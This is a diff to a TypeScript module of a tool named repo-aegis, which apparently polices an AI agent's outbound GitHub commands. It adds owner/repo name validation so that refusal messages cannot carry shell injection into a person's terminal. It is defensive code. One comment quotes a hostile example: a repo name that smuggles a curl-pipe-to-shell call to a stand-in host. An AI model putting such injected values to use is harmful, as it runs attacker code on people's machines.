@@ -39,11 +39,57 @@ export interface RefusalFix {
   when?: string;
   /** Short trailing remark, rendered in parentheses. */
   note?: string;
+  /**
+   * A person's step that is not a shell command (e.g. repair a file). Rendered
+   * `<A person|when, a person> <step>.` and used instead of `command`.
+   */
+  step?: string;
 }
+
+// ---------------------------------------------------------------------------
+// Destination names are untrusted
+// ---------------------------------------------------------------------------
+//
+// The owner and repo in a refusal come from the agent's own command line.
+// Refusal text routinely tells a person to paste a command (`repo-aegis
+// engagements add --personal-org <owner>`, `repo-aegis approve <owner>/<repo>`),
+// so an unvalidated name is a shell-injection vector into the human's terminal:
+// `gh issue create --repo 'x$(curl evil|sh)/r'`. A name is therefore only ever
+// interpolated after passing {@link safeDestination}.
+//
+// The test runs on the ORIGINAL string, ASCII only, and lower-cases afterwards.
+// Lower-casing first would turn U+212A (KELVIN SIGN) into a plain `k`.
+
+/** GitHub owner: alphanumerics and hyphens, at most 39 characters. */
+const SAFE_OWNER = /^[A-Za-z0-9][A-Za-z0-9-]{0,38}$/;
+/** GitHub repo: alphanumerics, `.`, `_`, `-`, at most 100 characters. */
+const SAFE_REPO = /^[A-Za-z0-9._-]{1,100}$/;
+
+/**
+ * The destination as safe, lower-cased `org`/`repo` strings, or `null` when
+ * either half is not a plausible GitHub name. A repo of exactly `*` (an
+ * org-level destination) is accepted; `.` and `..` are not.
+ */
+export function safeDestination(org: string, repo: string): { org: string; repo: string } | null {
+  if (!SAFE_OWNER.test(org)) return null;
+  if (repo !== "*" && (!SAFE_REPO.test(repo) || repo === "." || repo === "..")) return null;
+  return { org: org.toLowerCase(), repo: repo.toLowerCase() };
+}
+
+/** What stands in for a destination whose name failed {@link safeDestination}. */
+export const INVALID_DESTINATION_LABEL = "a destination with an invalid owner/repo name";
 
 export interface RefusalInput {
   /** The refusal code, e.g. `UNREGISTERED_OWNER_EGRESS`. */
   code: string;
+  /**
+   * The destination this refusal is about, with the verb label. When given and
+   * the name fails {@link safeDestination}, `what`, `why` and `fixes` are
+   * DISCARDED and a generic refusal is built that carries neither the name nor
+   * any command. Callers that interpolate a destination into text must pass it
+   * here, so every rule gets the protection.
+   */
+  destination?: { verb: string; org: string; repo: string };
   /** What was refused, e.g. `gh issue create → stranger/repo`. */
   what: string;
   /** Why, in one self-sufficient sentence. Some hosts truncate the reason. */
@@ -62,6 +108,9 @@ function sentence(text: string): string {
 function renderFix(fix: RefusalFix): string {
   const note = fix.note !== undefined ? ` (${fix.note})` : "";
   if (fix.by === "person") {
+    if (fix.step !== undefined) {
+      return `${fix.when !== undefined ? `${fix.when}, a person` : "A person"} ${fix.step}${note}.`;
+    }
     const lead = fix.when !== undefined ? `${fix.when}, a person runs` : "A person runs";
     return fix.command !== undefined
       ? `${lead}, from a terminal: ${fix.command}${note}.`
@@ -81,6 +130,15 @@ export function agentGuideAnchor(code: string): string {
  * `<what>: refused. <why> <approval> <fixes…> [<code>, see doc/agent-guide.md#<code>]`.
  */
 export function refusal(input: RefusalInput): string {
+  if (input.destination !== undefined && safeDestination(input.destination.org, input.destination.repo) === null) {
+    return [
+      `${input.destination.verb}: refused.`,
+      "The destination name is not a valid GitHub owner/repo, so repo-aegis cannot check, register or approve it.",
+      "No approval covers this.",
+      "Re-issue the command naming a valid <owner>/<repo>.",
+      `[${input.code}, see ${agentGuideAnchor(input.code)}]`,
+    ].join(" ");
+  }
   const parts = [`${input.what}: refused.`, sentence(input.why), sentence(input.approval)];
   for (const fix of input.fixes) parts.push(renderFix(fix));
   if (input.fixes.some(f => f.by === "person")) {
